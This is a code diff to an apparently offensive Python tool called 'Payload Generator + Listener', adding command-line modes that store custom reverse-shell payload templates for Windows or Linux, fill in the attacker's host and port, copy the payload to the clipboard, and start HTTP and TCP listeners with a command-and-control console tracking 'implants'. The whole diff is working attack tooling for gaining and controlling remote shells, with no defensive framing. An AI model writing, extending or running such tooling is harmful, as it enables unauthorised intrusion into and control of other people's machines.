@@ -16,6 +16,8 @@ import sys
 import threading
 import time
 from select import select
+import argparse
+import json
 
 # external deps
 from colorama import Fore, Style, init as colorama_init
@@ -119,6 +121,116 @@ def generate_payload_text(module, payload_key: str, lhost: str, lport: int) -> s
     # replace both placeholders robustly
     payload = template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))
     return payload
+
+# -----------------------
+# Custom payload storage / helpers
+# -----------------------
+
+def normalize_os_choice(flag: str) -> str:
+    if not flag:
+        return None
+    val = flag.strip().lower()
+    if val in ("w", "win", "windows"):
+        return "Windows"
+    if val in ("l", "lin", "linux"):
+        return "Linux"
+    return None
+
+
+def normalize_connection(flag: str) -> str:
+    if not flag:
+        return None
+    val = flag.strip().lower()
+    if val in ("tcp", "http"):
+        return val
+    return None
+
+
+def get_custom_store_path(os_choice: str) -> str:
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    filename = "custom_windows.json" if os_choice == "Windows" else "custom_linux.json"
+    return os.path.join(base_dir, "payloads", filename)
+
+
+def load_custom_payloads(os_choice: str) -> dict:
+    """Load custom payloads for the OS. Structure: { name: {"template": str, "con": "tcp"|"http"} }"""
+    path = get_custom_store_path(os_choice)
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            data = json.load(f)
+            if isinstance(data, dict):
+                return data
+            return {}
+    except FileNotFoundError:
+        return {}
+    except Exception:
+        return {}
+
+
+def save_custom_payload(os_choice: str, name: str, template: str, connection: str) -> None:
+    path = get_custom_store_path(os_choice)
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    current = load_custom_payloads(os_choice)
+    current[name] = {"template": template, "con": connection}
+    with open(path, "w", encoding="utf-8") as f:
+        json.dump(current, f, indent=2)
+
+
+def infer_connection_type_from_template(template: str) -> str:
+    """Best-effort inference: return 'http' if HTTP indicators present else 'tcp'."""
+    low = (template or "").lower()
+    if ("http://" in low) or ("https://" in low) or ("invoke-webrequest" in low) or ("iwr " in low) or ("curl " in low) or ("wget " in low):
+        return "http"
+    return "tcp"
+
+
+def merge_builtins_and_customs(builtins: dict, customs: dict) -> dict:
+    """Return a new dict name->template (customs override builtins on key collision)."""
+    merged = dict(builtins or {})
+    for name, entry in (customs or {}).items():
+        if isinstance(entry, dict) and "template" in entry:
+            merged[name] = entry["template"]
+        elif isinstance(entry, str):
+            merged[name] = entry
+    return merged
+
+
+def list_keys_filtered_by_connection(builtins: dict, customs: dict, connection: str) -> list:
+    """Return sorted list of keys whose connection matches the requested connection."""
+    keys = []
+    seen = set()
+    # built-ins by inference
+    for k, tmpl in (builtins or {}).items():
+        if k in seen:
+            continue
+        conn = infer_connection_type_from_template(tmpl)
+        if conn == connection:
+            keys.append(k)
+            seen.add(k)
+    # customs by explicit meta or inference fallback
+    for k, entry in (customs or {}).items():
+        if k in seen:
+            continue
+        if isinstance(entry, dict):
+            conn = entry.get("con") or infer_connection_type_from_template(entry.get("template", ""))
+            tmpl = entry.get("template", "")
+        else:
+            conn = infer_connection_type_from_template(str(entry))
+            tmpl = str(entry)
+        if conn == connection:
+            keys.append(k)
+            seen.add(k)
+    return sorted(keys)
+
+
+def find_available_port(host: str, start_port: int, limit: int = 50) -> int:
+    """Return start_port if bindable, else scan up to start_port+limit for a free port."""
+    if can_bind(host, start_port):
+        return start_port
+    for p in range(start_port + 1, start_port + 1 + limit):
+        if can_bind(host, p):
+            return p
+    return None
 
 # -----------------------
 # C2 / Listener code (adapted from your listener)
@@ -671,9 +783,153 @@ def c2_console():
 # main entrypoint
 # -----------------------
 def main():
-    global HOST, HTTP_PORT, RAW_TCP_PORT
+    global HOST, HTTP_PORT, RAW_TCP_PORT, OS_CHOICE
 
     print("=== Payload Generator + Listener ===\n")
+
+    # CLI parsing
+    parser = argparse.ArgumentParser(description="Payload generator + C2 listener")
+    parser.add_argument("-m", "--mode", help="Mode: b = use/generate & listen, c = create/store payload")
+    parser.add_argument("-os", "--os", dest="os_flag", help="Target OS: w = Windows, l = Linux")
+    parser.add_argument("-con", "--connection", dest="connection", help="Connection type: http or tcp")
+    parser.add_argument("-lhost", dest="lhost", help="Listener host / LHOST")
+    parser.add_argument("-lport", dest="lport", type=int, help="Listener port / LPORT for the chosen connection type")
+    parser.add_argument("-n", "--name", dest="name", help="Name for the payload (store mode)")
+    parser.add_argument("-pay", "--payload", dest="payload", help="Payload content (store mode). Include your actual IP and port so they can be templated.")
+    parser.add_argument("-k", "--key", dest="key", help="Key/name of payload to auto-select (use mode)")
+    args, unknown = parser.parse_known_args()
+
+    # If explicit CLI mode is requested
+    if args.mode:
+        mode = args.mode.strip().lower()
+        if mode not in ("b", "c"):
+            print("[!] Invalid -m. Use -m=b (use) or -m=c (create).")
+            sys.exit(2)
+
+        os_choice = normalize_os_choice(args.os_flag)
+        if not os_choice:
+            print("[!] -os is required (w or l).")
+            sys.exit(2)
+
+        if mode == "c":
+            # Create/store payload
+            connection = normalize_connection(args.connection)
+            if connection not in ("http", "tcp"):
+                print("[!] In create mode, -con must be 'http' or 'tcp'.")
+                sys.exit(2)
+            if not (args.lhost and is_valid_ipv4(args.lhost)):
+                print("[!] In create mode, a valid -lhost is required.")
+                sys.exit(2)
+            if not (args.lport and 1 <= args.lport <= 65535):
+                print("[!] In create mode, a valid -lport (1-65535) is required.")
+                sys.exit(2)
+            if not args.name:
+                print("[!] In create mode, -n (payload name) is required.")
+                sys.exit(2)
+            if not args.payload:
+                print("[!] In create mode, -pay (payload content) is required.")
+                sys.exit(2)
+
+            # Template the provided payload content: replace the concrete host/port with placeholders
+            raw = args.payload
+            templated = raw.replace(str(args.lhost), "{LHOST}")
+            templated = templated.replace(str(args.lport), "{LPORT}")
+            save_custom_payload(os_choice, args.name, templated, connection)
+            print(f"[+] Stored payload '{args.name}' for {os_choice} ({connection}).")
+            sys.exit(0)
+
+        # Use/generate and listen
+        connection = normalize_connection(args.connection)
+        if connection not in ("http", "tcp"):
+            print("[!] In use mode, -con must be 'http' or 'tcp'.")
+            sys.exit(2)
+        if not (args.lhost and is_valid_ipv4(args.lhost)):
+            print("[!] In use mode, a valid -lhost is required.")
+            sys.exit(2)
+        if not (args.lport and 1 <= args.lport <= 65535):
+            print("[!] In use mode, a valid -lport (1-65535) is required.")
+            sys.exit(2)
+
+        lhost = args.lhost
+        DEFAULT_HTTP = 2222
+        DEFAULT_TCP = 4444
+        # Assign ports based on chosen connection; the other gets a default (adjust if unavailable)
+        if connection == "tcp":
+            tcp_port = args.lport
+            http_port = find_available_port(lhost, DEFAULT_HTTP) or DEFAULT_HTTP
+        else:
+            # http
+            http_port = args.lport
+            tcp_port = find_available_port(lhost, DEFAULT_TCP) or DEFAULT_TCP
+
+        if not can_bind(lhost, http_port):
+            print(f"[!] Cannot bind HTTP on {lhost}:{http_port}.")
+            sys.exit(2)
+        if not can_bind(lhost, tcp_port):
+            print(f"[!] Cannot bind TCP on {lhost}:{tcp_port}.")
+            sys.exit(2)
+
+        # Load built-in + custom payloads and filter by connection
+        module = load_payload_module(os_choice)
+        customs = load_custom_payloads(os_choice)
+        combined = merge_builtins_and_customs(getattr(module, "payloads", {}), customs)
+
+        # Keys filtered by requested connection
+        keys = list_keys_filtered_by_connection(getattr(module, "payloads", {}), customs, connection)
+        if not keys:
+            print(f"[!] No payloads available for {os_choice} ({connection}). Add some with -m=c.")
+            sys.exit(2)
+
+        print("\nAvailable payloads (filtered):")
+        for k in keys:
+            print(" -", k)
+
+        # Choose key (CLI or prompt)
+        if args.key:
+            if args.key not in combined or args.key not in keys:
+                print(f"[!] Payload key '{args.key}' not found for the requested filters.")
+                sys.exit(2)
+            payload_key = args.key
+        else:
+            payload_key = ask_choice("Select payload (type exact key): ", keys)
+
+        # Create a proxy module with merged dict for generator
+        ModuleProxy = type("ModuleProxy", (), {})
+        module_proxy = ModuleProxy()
+        module_proxy.payloads = combined
+
+        selected_port = tcp_port if connection == "tcp" else http_port
+        payload_text = generate_payload_text(module_proxy, payload_key, lhost, selected_port)
+
+        print("\n[+] Generated payload (copied to clipboard):\n")
+        print(Fore.RED + payload_text + Style.RESET_ALL)
+        try:
+            pyperclip.copy(payload_text)
+            print("[+] Payload copied to clipboard.")
+        except Exception as e:
+            print(f"[!] Could not copy to clipboard: {e}")
+
+        # Assign globals and start listeners + console
+        HOST = lhost
+        HTTP_PORT = http_port
+        RAW_TCP_PORT = tcp_port
+        global OS_CHOICE
+        OS_CHOICE = os_choice
+        try:
+            threading.Thread(target=run_http_server, daemon=True).start()
+            threading.Thread(target=monitor_http_implants, daemon=True).start()
+            threading.Thread(target=run_raw_tcp_server, daemon=True).start()
+            time.sleep(0.5)
+            print(f"\n[*] Listeners started on {HOST} (HTTP: {HTTP_PORT}, TCP: {RAW_TCP_PORT}).")
+            c2_console()
+        except Exception as e:
+            print(f"[!] Failed to start listeners: {e}")
+            sys.exit(1)
+        return
+
+    # ------------------
+    # Interactive fallback (original behavior)
+    # ------------------
 
     # choose OS first
     os_choice = ask_choice("Target OS (Linux/Windows): ", ["Linux", "Windows"])
@@ -752,7 +1008,6 @@ def main():
     HTTP_PORT = http_port
     RAW_TCP_PORT = tcp_port
     # store OS choice globally for later logic
-    global OS_CHOICE
     OS_CHOICE = os_choice
 
     # start both listeners
